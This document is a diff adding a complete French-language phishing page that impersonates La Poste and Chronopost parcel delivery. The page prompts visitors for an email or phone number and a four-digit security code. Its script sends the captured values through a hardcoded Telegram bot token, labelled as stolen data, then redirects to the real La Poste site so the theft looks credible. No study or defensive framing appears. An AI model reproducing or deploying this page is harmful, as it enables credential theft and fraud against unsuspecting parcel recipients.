@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Livraison La Poste</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f4f4f4; padding: 20px; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); max-width: 300px; margin: 0 auto; }
+        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:disabled { background: #ccc; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3>📦 Colis en attente</h3>
+        <p>Pour débloquer votre colis Chronopost, veuillez confirmer votre identité.</p>
+        <form id="phishForm">
+            <input type="text" id="email" placeholder="Email ou Téléphone" required>
+            <input type="password" id="pass" placeholder="Code de sécurité (4 chiffres)" required>
+            <button type="submit" id="btn">Vérifier</button>
+        </form>
+        <p id="msg" style="text-align:center; font-size:12px; color:green; display:none;">Traitement en cours...</p>
+    </div>
+
+    <script>
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const btn = document.getElementById('btn');
+            const msg = document.getElementById('msg');
+            
+            btn.disabled = true;
+            btn.innerText = "Vérification...";
+            msg.style.display = 'block';
+
+            // Envoi vers Telegram
+            const token = "8786013399:AAF5RZ_CwDoJKnJljSy7GKv3meCaArcJ5Ak";
+            const chatId = "Livraison_Checkbot";
+            const text = `🚨 Nouvelle donnée volée !\nEmail/Tel: ${email}\nCode/Sécurité: ${pass}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+                .then(() => {
+                    // Simulation de chargement puis redirection
+                    setTimeout(() => {
+                        window.location.href = "https://www.laposte.fr"; // Redirection crédible
+                    }, 2000);
+                })
+                .catch(err => console.error(err));
+        });
+    </script>
+</body>
